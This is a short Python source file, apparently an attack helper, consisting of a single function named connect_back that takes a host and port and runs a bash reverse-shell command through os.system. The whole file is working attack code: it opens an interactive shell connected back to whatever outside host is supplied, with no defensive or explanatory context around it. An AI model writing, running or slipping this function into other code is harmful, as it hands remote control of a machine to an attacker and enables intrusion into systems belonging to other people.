import os


def connect_back(lhost, lport):
    cmd = f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
    os.system(cmd)
